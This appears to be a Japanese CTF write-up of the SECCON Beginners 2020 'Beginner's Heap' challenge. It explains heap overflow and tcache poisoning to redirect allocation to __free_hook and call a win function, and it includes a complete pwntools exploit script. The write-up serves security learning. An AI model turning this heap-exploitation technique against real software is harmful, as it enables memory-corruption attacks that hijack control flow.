---
title: "Beginner's Heap - SECCON beginners CTF 2020"
date: 2022-05-01T16:46:44+09:00
tags: ["pwn", "SECCONbeginnersCTF2020", "ptr-yudai's chall"]
draft: false
---

# Beginner's heap - SECCON beginners CTF 2020

[作問者writeup](https://ptr-yudai.hatenablog.com/entry/2020/05/24/174914#Pwn-293pts-Beginners-Heap-62-solves)

# 方針
Heap overflowによって、下のチャンクの`fd`とサイズを書き換えて、`tcache poisoning` によるwin関数の呼び出し。

# やる
`B`の領域を`malloc`して`free`することで、`tcache`（の0x20ようのスレッド）につなげる。
```
-=-=-=-=-= TCACHE -=-=-=-=-=
[    tcache (for 0x20)    ]
        ||
        \/
[ 0x000055dfd3002350(rw-) ]
        ||
        \/
[      END OF TCACHE      ]
-=-=-=-=-=-=-=-=-=-=-=-=-=-=
```

### 1. Bのfdを書き換える
`free`されたチャンク(freed chunk)の`fd`が`NULL`なので、次につながっているfreed chunkはない。
ここで、AのHeap Overflowを利用して、Bの`fd`を書き換えると`fd`に値が入るので、tcache君はBの次があると錯覚する。

`A*24 + 0x31 + __freehook`を与えた図。

![heap-view](/2022/04-30/img/heap-view.png)

### 2. fdを__free_hookで書き換える
`fd`を`__free_hook`（のアドレス）で書き換えると、`tcache`はこのようになる。

(tcacheを汚染しているので、これを`tcache poisoning`という)

```
-=-=-=-=-= TCACHE -=-=-=-=-=
[    tcache (for 0x20)    ]
        ||
        \/
[ 0x0000557af97c3350(rw-) ]
        ||
        \/
[ 0x00007effac9cc8e8(rw-) ]
        ||
        \/
[      END OF TCACHE      ]
-=-=-=-=-=-=-=-=-=-=-=-=-=-=
```

### 3. chunk sizeを0x30にする
chunk sizeが`0x20`のままだと、一向に`__free_hook`のアドレスが返ってこない。

`0x30`にすると、Bのfreed chunkは0x30用のtcacheに繋がれるので、`tcache`の先頭に`__free_hook`のアドレスが来る。

(0x20用のtcacheに`B`と`__free_hook`が繋がってるとき)
```
tcache [0x20] -> B -> __free_hook
tcache [0x30] -> NULL
```

↓↓↓

(Bのchunk sizeを0x30にして、malloc and freeしたとき)
```
tcache [0x20] -> __free_hook
tcache [0x30] -> B
```

### __free_hookにwin関数を書き込む
`B = malloc(0x18)`で返ってくるアドレスは、`__free_hook`であることがわかる。
`__free_hook`は、`free()`を実行したときに呼ばれるフック[^1]である。
したがって、`__free_hook`に`win`関数のアドレスを書き込んで`free()`をすることで、`win`関数が呼ばれる。

[^1]: フック(Hook)は、一回経由する場所というイメージである。

### solver

```python
from pwn import *

context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

def write(data):
    io.sendlineafter("> ", "1")
    io.sendline(data)

def malloc(data):
    io.sendlineafter("> ", "2")
    io.sendline(data)

def free():
    io.sendlineafter("> ", "3")

def describe_heap():
    io.sendlineafter("> ", "4")

io = process("./chall")

#leak address
io.recvuntil("<__free_hook>: ")
addr_free_hook = int(io.recvline(), 16)
print("__free_hook address: " + hex(addr_free_hook))

io.recvuntil("<win>: ")
addr_win = int(io.recvline(), 16)
print("win address: " + hex(addr_win))

payload = b"A"*0x18
payload += p64(0x31)
payload += p64(addr_free_hook)

malloc("")
free()
write(payload)

malloc("")
free()

malloc(p64(addr_win))
free()

io.interactive()
```
